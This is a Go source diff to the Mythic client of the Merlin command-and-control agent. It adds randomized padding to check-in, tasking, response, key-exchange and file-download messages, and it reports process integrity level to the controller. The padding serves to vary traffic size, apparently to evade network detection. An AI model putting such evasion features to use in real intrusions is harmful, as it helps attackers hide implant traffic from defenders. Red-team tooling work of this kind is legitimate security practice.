@@ -34,6 +34,7 @@ import (
 	"fmt"
 	"io"
 	"io/ioutil"
+	rand2 "math/rand"
 	"net"
 	"net/http"
 	"net/url"
@@ -132,6 +133,12 @@ func New(config Config) (*Client, error) {
 		return &client, fmt.Errorf("there was an error generating the RSA key pair:\r\n%s", err)
 	}
 
+	// Parse Padding Value
+	client.PaddingMax, err = strconv.Atoi(config.Padding)
+	if err != nil {
+		cli.Message(cli.WARN, fmt.Sprintf("there was an error converting Padding string \"%s\" to an integer: %s", config.Padding, err))
+	}
+
 	cli.Message(cli.INFO, "Client information:")
 	cli.Message(cli.INFO, fmt.Sprintf("\tProtocol: %s", client.Protocol))
 	cli.Message(cli.INFO, fmt.Sprintf("\tURL: %s", client.URL))
@@ -157,6 +164,12 @@ func (client *Client) Auth(authType string, register bool) (messages.Base, error
 func (client *Client) SendMerlinMessage(m messages.Base) (messages.Base, error) {
 	cli.Message(cli.DEBUG, "Entering into clients.mythic.SendMerlinMessage()...")
 	cli.Message(cli.DEBUG, fmt.Sprintf("input message base:\r\n%+v", m))
+
+	// Set the message padding
+	if client.PaddingMax > 0 {
+		m.Padding = core.RandStringBytesMaskImprSrc(rand2.Intn(client.PaddingMax))
+	}
+	cli.Message(cli.DEBUG, fmt.Sprintf("Added message padding size: %d", len(m.Padding)))
 
 	payload, err := client.convertToMythicMessage(m)
 	if err != nil {
@@ -242,7 +255,7 @@ func (client *Client) Initial(agent messages.AgentInfo) (messages.Base, error) {
 		PayloadID:     client.MythicID.String(), // Need to set now because it will be changed to tempUUID from RSA key exchange
 		Arch:          agent.SysInfo.Architecture,
 		Domain:        agent.SysInfo.Domain,
-		Integrity:     0,
+		Integrity:     agent.SysInfo.Integrity,
 		ExternalIP:    "",
 		EncryptionKey: "",
 		DecryptionKey: "",
@@ -539,7 +552,7 @@ func (client *Client) convertToMerlinMessage(data []byte) (messages.Base, error)
 // encrypts it, prepends the Mythic UUID, and Base64 encodes the entire string
 func (client *Client) convertToMythicMessage(m messages.Base) (string, error) {
 	cli.Message(cli.DEBUG, "Entering into clients.mythic.convertToMythic()...")
-	cli.Message(cli.DEBUG, fmt.Sprintf("input message base:\r\n %+v", m))
+	cli.Message(cli.DEBUG, fmt.Sprintf("Input Merlin message base:\r\n %+v", m))
 
 	var err error
 	var data []byte
@@ -548,15 +561,18 @@ func (client *Client) convertToMythicMessage(m messages.Base) (string, error) {
 	case messages.CHECKIN:
 		// Send the very first checkin message
 		if m.Payload != nil {
+			msg := m.Payload.(CheckIn)
+			msg.Padding = m.Padding
 			// Marshal the structure to a JSON object
-			data, err = json.Marshal(m.Payload.(CheckIn))
+			data, err = json.Marshal(msg)
 			if err != nil {
 				return "", fmt.Errorf("there was an error marshalling the mythic.CheckIn structrong to JSON:\r\n%s", err)
 			}
 		} else { // Merlin had no responses to send back
 			task := Tasking{
-				Action: TASKING,
-				Size:   -1,
+				Action:  TASKING,
+				Size:    -1,
+				Padding: m.Padding,
 			}
 			// Marshal the structure to a JSON object
 			data, err = json.Marshal(task)
@@ -566,7 +582,8 @@ func (client *Client) convertToMythicMessage(m messages.Base) (string, error) {
 		}
 	case messages.JOBS:
 		returnMessage := PostResponse{
-			Action: RESPONSE,
+			Action:  RESPONSE,
+			Padding: m.Padding,
 		}
 		// Convert Merlin job to mythic response
 		for _, job := range m.Payload.([]jobs.Job) {
@@ -626,14 +643,17 @@ func (client *Client) convertToMythicMessage(m messages.Base) (string, error) {
 		}
 	case messages.KEYEXCHANGE:
 		if m.Payload != nil {
-			data, err = json.Marshal(m.Payload.(RSARequest))
+			msg := m.Payload.(RSARequest)
+			msg.Padding = m.Padding
+			data, err = json.Marshal(msg)
 			if err != nil {
 				return "", fmt.Errorf("there was an error marshalling the mythic.RSARequest structrong to JSON:\r\n%s", err)
 			}
 		}
 	case DownloadInit:
 		returnMessage := PostResponseFile{
-			Action: RESPONSE,
+			Action:  RESPONSE,
+			Padding: m.Padding,
 		}
 		returnMessage.Responses = append(returnMessage.Responses, m.Payload.(FileDownloadInitialMessage))
 		data, err = json.Marshal(returnMessage)
@@ -642,7 +662,8 @@ func (client *Client) convertToMythicMessage(m messages.Base) (string, error) {
 		}
 	case DownloadSend:
 		returnMessage := PostResponseDownload{
-			Action: RESPONSE,
+			Action:  RESPONSE,
+			Padding: m.Padding,
 		}
 		returnMessage.Responses = append(returnMessage.Responses, m.Payload.(FileDownload))
 		data, err = json.Marshal(returnMessage)
